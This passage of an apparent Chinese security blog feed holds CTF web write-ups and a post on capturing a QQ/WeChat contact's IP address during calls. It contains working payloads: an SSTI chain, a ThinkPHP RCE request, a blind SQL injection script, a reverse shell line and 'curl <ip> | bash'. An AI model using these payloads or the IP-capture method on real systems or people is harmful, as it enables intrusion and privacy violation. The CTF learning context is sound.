class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化适配器对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数这里是字符串拼接，还给了提示，__toString()，搜索__toString()，在Query函数中找到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> KEYWORDS = <span class="string">'*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL'</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $_default = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'action'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'table'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'fields'</span> =&gt; <span class="string">'*'</span>,</span><br><span class="line">        <span class="string">'join'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">'where'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'limit'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'offset'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'order'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'group'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'having'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'rows'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">private</span> $_prefix;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'action'</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'INSERT INTO '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="string">' VALUES '</span></span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'limit'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'DELETE FROM '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">"$key = $val"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">'UPDATE '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">' SET '</span> . implode(<span class="string">' , '</span>, $columns)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到这里就发现select处可以构造soapclient，进行ssrf。</p><p>整理一下pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld_DB::__wakeup()-&gt;Typecho_Db::__construct()-&gt;Typecho_Db_Query::__toString()-&gt;SoapClient::-&gt;__call()</span><br></pre></td></tr></table></figure><p>有了pop链了，开始写脚本，在写脚本的过程中发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>soap类无法传入session，但是使用CRLF注入</p><blockquote><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p><p>[参考链接](<a href="https://wooyun.js.org/drops/CRLF" target="_blank" rel="noopener">https://wooyun.js.org/drops/CRLF</a> Injection漏洞的利用与实例分析.html)</p></blockquote><p>在user-agengt处使用\r\n进行换行</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;ez-bypass&quot;&gt;&lt;a href=&quot;#ez-bypass&quot; class=&quot;headerlink&quot; title=&quot;ez_bypass&quot;&gt;&lt;/a&gt;ez_bypass&lt;/h2&gt;&lt;p&gt;打开题目就有源码&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
      <category term="wp" scheme="https://sunny250.github.io/tags/wp/"/>
    
      <category term="待完成" scheme="https://sunny250.github.io/tags/%E5%BE%85%E5%AE%8C%E6%88%90/"/>
    
  </entry>
  
  <entry>
    <title>获取好友IP</title>
    <link href="https://sunny250.github.io/2020/03/24/%E8%8E%B7%E5%8F%96%E5%A5%BD%E5%8F%8BIP/"/>
    <id>https://sunny250.github.io/2020/03/24/%E8%8E%B7%E5%8F%96%E5%A5%BD%E5%8F%8BIP/</id>
    <published>2020-03-24T08:54:40.000Z</published>
    <updated>2020-03-24T08:54:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装了火绒的方式"><a href="#安装了火绒的方式" class="headerlink" title="安装了火绒的方式"></a>安装了火绒的方式</h2><p>打开火绒剑点击Processes，找到QQ/微信的PID</p><ol><li><p>点击Fileter</p></li><li><p>下拉选择Process Filter</p></li></ol><a id="more"></a><ol start="3"><li><p>选择Process</p></li><li><p>点击add </p></li><li><p>选择PID</p></li><li><p>Value填QQ/微信的PID</p></li><li><p>切换到Action</p></li><li><p>只选中MT_netmon</p></li><li><p>点击OK</p></li></ol><p><img src="/pic/136.png" alt=""></p><p><img src="/pic/137.png" alt=""></p><p>然后点击Start，此处已经点击了Start，所以变成Stop</p><p><img src="/pic/138.png" alt=""></p><p>在Path处非8000端口即可能得到好友IP，此处因为本菜鸡多次测试（猜测，也能是网络不好），被腾讯强制连接到了腾讯的服务器</p><h2 id="未安装火绒的方式"><a href="#未安装火绒的方式" class="headerlink" title="未安装火绒的方式"></a>未安装火绒的方式</h2><p>打开wireshark 选择上网网卡，双击</p><p><del><img src="/pic/133.png" alt=""></del></p><p><del>点击搜索按钮（快捷键Ctrl+F），选择Packet details（中文：分组详情）,Sting(中文：字符串)</del></p><p><del>填入数据020048</del></p><p><del><img src="/pic/134.png" alt=""></del></p><p>在搜索栏里输入udp.lenth==80（经过测试，拨打后未接通发送的数据包的大小是72，因为还有包头所以+8）</p><p>然后就可以拨打好友的电话</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>多次挂断电话，再接通，会直接接入到腾讯服务器，从而后面就获取不到对方IP（此时电话以及接通）如下图</p><p><img src="/pic/135.png" alt=""></p><p>对方QQ版本为QQ FOR win10(Microsoft  store中下载)，本菜鸡测试 ：未接通没有数据</p><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>腾讯连接的方式是如果检测到处于同一内网，QQ/TIM会直接点对点，这也就解释了为什么学校晚上断网后还能互发QQ消息。</p><p><strong>参考链接</strong></p><p><a href="https://www.secpulse.com/archives/126081.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/126081.html</a><br><a href="https://www.cnblogs.com/Oran9e/p/7098097.html" target="_blank" rel="noopener">https://www.cnblogs.com/Oran9e/p/7098097.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;安装了火绒的方式&quot;&gt;&lt;a href=&quot;#安装了火绒的方式&quot; class=&quot;headerlink&quot; title=&quot;安装了火绒的方式&quot;&gt;&lt;/a&gt;安装了火绒的方式&lt;/h2&gt;&lt;p&gt;打开火绒剑点击Processes，找到QQ/微信的PID&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;点击Fileter&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;下拉选择Process Filter&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="日常水文" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E6%B0%B4%E6%96%87/"/>
    
    
      <category term="无聊" scheme="https://sunny250.github.io/tags/%E6%97%A0%E8%81%8A/"/>
    
      <category term="水文" scheme="https://sunny250.github.io/tags/%E6%B0%B4%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>第二届BJDCTFwp-web</title>
    <link href="https://sunny250.github.io/2020/03/21/%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTFwp-web/"/>
    <id>https://sunny250.github.io/2020/03/21/%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTFwp-web/</id>
    <published>2020-03-21T06:48:08.000Z</published>
    <updated>2020-03-21T06:48:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h2><p>打开后是一个谷歌的界面，随意输入数据后查看源码，提示SSTI</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--ssssssti &amp; a little trick --&gt;</span> P3's girlfirend is : 1<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试过滤，非数字时{被过滤，使用url编码绕过即可</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">paylaod:</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">%7b%25%20%66%6f%72%20%63%20%69%6e%20%5b%5d%2e%5f%5f%63%6c%61%73%73%5f%5f%2e%5f%5f%62%61%73%65%5f%5f%2e%5f%5f%73%75%62%63%6c%61%73%73%65%73%5f%5f%28%29%20%25%7d%7b%25%20%69%66%20%63%2e%5f%5f%6e%61%6d%65%5f%5f%3d%3d%27%63%61%74%63%68%5f%77%61%72%6e%69%6e%67%73%27%20%25%7d%7b%7b%20%63%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%27%5d%2e%65%76%61%6c%28%22%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%70%6f%70%65%6e%28%27%63%61%74%20%2f%66%6c%61%67%27%29%2e%72%65%61%64%28%29%22%29%20%7d%7d%7b%25%20%65%6e%64%69%66%20%25%7d%7b%25%20%65%6e%64%66%6f%72%20%25%7d</span><br></pre></td></tr></table></figure><h2 id="old-hack-1"><a href="#old-hack-1" class="headerlink" title="old-hack"></a>old-hack</h2><p>打开页面就提示powered by thinkphp</p><p>搜索漏洞</p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p><p>直接利用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?s=captcha</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 733fb3d8-d4b8-451e-91bf-78b47cf3db15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 89</span><br><span class="line"><span class="attribute">Origin</span>: http://733fb3d8-d4b8-451e-91bf-78b47cf3db15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://733fb3d8-d4b8-451e-91bf-78b47cf3db15.node3.buuoj.cn/?s=captcha</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter%5B%5D=system&amp;method=get&amp;server%5BREQUEST_METHOD%5D=cat+%2Fflag</span><br></pre></td></tr></table></figure><h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>测试发现过滤的单引号，select，但是有两个输入处，测试是盲注，可以转义一个单引号，然后注释一个单引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">username&#x3D;admin\&amp;password&#x3D;or 0#</span><br></pre></td></tr></table></figure><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    hexs=<span class="string">'0x'</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(strs)):</span><br><span class="line">        hexs+=hex(ord(strs[x]))[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(hexs)</span></span><br><span class="line">    <span class="keyword">return</span> hexs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url=<span class="string">'http://d13d29d3-e336-4af5-adc9-6f48b9878152.node3.buuoj.cn'</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line"></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'1\\'</span>,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'or '</span>+payload+<span class="string">'#'</span></span><br><span class="line">    &#125;</span><br><span class="line">    html = requests.post(url,data=data)</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="comment"># print(html.text)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line">            <span class="comment"># t1=time.time()</span></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'stronger'</span> <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    <span class="comment"># print(database)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_passwrod</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'password'</span></span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># get_database() #p3rh4ps</span></span><br><span class="line">    get_passwrod() <span class="comment">#OhyOuFOuNdit</span></span><br></pre></td></tr></table></figure><p>登入即可拿到flag</p><h2 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h2><p>提示源码是swp文件，访问/.index.php.swp，然后恢复得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#39;girl_friend&#39;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl &#x3D; $_POST[&#39;girl_friend&#39;];</span><br><span class="line">    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;</span><br><span class="line">        die(&#39;just girl&#39;);</span><br><span class="line">    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F;duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了<code>/，&gt;，\</code>不能直接反弹，但是可以使用curl、wget等其他命令来获取外部弹shell的命令，</p><p>将反弹shell命令写入文件index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>本地起一个web服务器,然后后台运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:80 &amp;</span><br><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure><p>post数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend&#x3D;curl 174.1.75.158 | bash</span><br></pre></td></tr></table></figure><p>即可收到shell</p><p>flag不在/flag中，然后找flag，grep能用，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash-4.4$ grep -r <span class="string">"flag&#123;"</span> /etc</span><br><span class="line">grep -r <span class="string">"flag&#123;"</span> /etc</span><br><span class="line">grep: /etc/crontabs/root: Permission denied</span><br><span class="line">grep: /etc/shadow: Permission denied</span><br><span class="line">/etc/demo/P3rh4ps/love/you/flag:flag&#123;6d6c7ac7-8d71-4e3e-a08d-9ba541ef6fa9&#125;</span><br><span class="line">grep: /etc/mysql/my.cnf: Permission denied</span><br><span class="line">grep: /etc/shadow-: Permission denied</span><br></pre></td></tr></table></figure><h2 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h2><p>打开题目是一个爆破界面，说爆破的时间越久，成功率越大</p><p>查看源码，有一条隐藏的提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"white"</span>&gt;</span>Note : Remenmber to remove test.php!<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 